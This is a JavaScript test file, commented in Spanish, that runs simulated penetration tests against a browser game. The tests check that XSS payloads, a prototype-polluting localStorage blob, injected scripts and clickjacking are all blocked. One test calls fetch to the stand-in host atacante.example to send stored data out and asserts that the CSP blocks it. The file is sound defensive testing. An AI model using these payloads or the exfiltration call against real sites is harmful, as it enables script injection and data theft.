'use strict';
const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const h = require('./ayudantes');

const PAYLOADS = [
  '<img src=x onerror="window.__xss=1">',
  '<script>window.__xss=1</script>',
  '"><svg onload=window.__xss=1>',
  "javascript:window.__xss=1",
  '{{constructor.constructor("window.__xss=1")()}}'
];

// Ataques simulados (XSS, manipulación de almacenamiento, contaminación de prototipos, clickjacking).
describe('16 · Pruebas de penetración', () => {
  let env;
  before(async () => { env = await h.preparar(); });
  after(async () => env.cerrar());

  for (const carga of PAYLOADS) {
    it('XSS por el nombre no se ejecuta: ' + carga.slice(0, 30), async () => {
      const { page, cerrar } = await h.nuevaPagina(env);
      await h.iniciarPartida(page, carga);
      await page.click('#btn-hub-report');
      await page.waitForTimeout(100);
      assert.equal(await page.evaluate(() => window.__xss), undefined);
      assert.equal(await page.locator('#view-report img, #view-report script, #view-report svg').count(), 0);
      const nombre = await h.texto(page, '#report-student-name');
      assert.doesNotMatch(nombre, /[<>"=(){}]/);
      await cerrar();
    });
  }

  it('localStorage manipulado con XSS y __proto__ se neutraliza', async () => {
    const malicioso = '{"studentName":"<img src=x onerror=window.__xss=1>","__proto__":{"pwned":true},"sandbox":"true","missions":[{"levels":[true,true,true],"best":[9999,9999,9999],"__proto__":{"pwned":true}}],"history":[{"result":"constructor","ts":1}]}';
    const { page, errores, cerrar } = await h.nuevaPagina(env, { antes: h.sembrarEstado(malicioso) });
    await page.click('#btn-start-game');
    const r = await page.evaluate(() => ({ xss: window.__xss, pwned: ({}).pwned, img: document.querySelectorAll('img').length }));
    assert.deepEqual(r, { xss: undefined, pwned: undefined, img: 0 });
    assert.equal(await h.texto(page, '#hud-score'), 'Puntos: 100/500');
    assert.equal(await page.isDisabled('#door-2'), true);
    assert.deepEqual(errores, []);
    await cerrar();
  });

  it('la CSP bloquea scripts y manejadores inyectados en el DOM', async () => {
    const { page, cerrar } = await h.nuevaPagina(env);
    const violaciones = await page.evaluate(() => new Promise((resolve) => {
      let n = 0;
      document.addEventListener('securitypolicyviolation', () => { n++; });
      const s = document.createElement('script'); s.textContent = 'window.__xss=1'; document.body.appendChild(s);
      const i = document.createElement('img'); i.setAttribute('onerror', 'window.__xss=2'); i.src = 'data:,x'; document.body.appendChild(i);
      setTimeout(() => resolve(n), 300);
    }));
    assert.equal(await page.evaluate(() => window.__xss), undefined);
    assert.ok(violaciones >= 1);
    await cerrar();
  });

  it('la CSP impide exfiltrar datos con fetch a dominios externos', async () => {
    const { page, cerrar } = await h.nuevaPagina(env);
    const r = await page.evaluate(() => fetch('https://atacante.example/robar?d=' + encodeURIComponent(localStorage.getItem('cybershield.v1'))).then(() => 'enviado', () => 'bloqueado'));
    assert.equal(r, 'bloqueado');
    await cerrar();
  });

  it('clickjacking: no se puede cargar dentro de un iframe', async () => {
    const { page, cerrar } = await h.nuevaPagina(env);
    await page.setContent('<iframe id="f" src="' + env.url + '" width="800" height="600"></iframe>');
    await page.waitForTimeout(800);
    const frame = page.frames().find((f) => f !== page.mainFrame());
    const cargado = frame ? await frame.evaluate(() => !!window.CyberShieldCore).catch(() => false) : false;
    assert.equal(cargado, false);
    await cerrar();
  });
});
